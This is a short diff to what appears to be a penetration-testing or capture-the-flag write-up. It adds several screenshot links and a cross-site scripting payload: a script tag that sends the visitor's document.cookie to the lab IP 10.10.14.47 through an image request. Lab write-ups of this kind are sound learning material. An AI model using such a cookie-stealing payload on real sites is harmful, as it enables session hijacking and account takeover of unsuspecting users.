@@ -96,3 +96,11 @@ by Ben "epi" Risher 🤓                 ver: 2.10.4
 ![image](https://github.com/user-attachments/assets/1a624181-7897-4005-bb0f-13fac63fc3ec)
 
 ![image](https://github.com/user-attachments/assets/dc1d7bcf-ed72-4b3a-ba99-d321a19c5282)
+
+![image](https://github.com/user-attachments/assets/6ee1f70c-b15b-463d-8770-1c184b2687f1)
+
+```js
+<script>var i=new Image(); i.src="http://10.10.14.47/?c="+document.cookie;</script>
+```
+![image](https://github.com/user-attachments/assets/1c522809-9751-4e4f-b49b-c7f9034f057d)
+
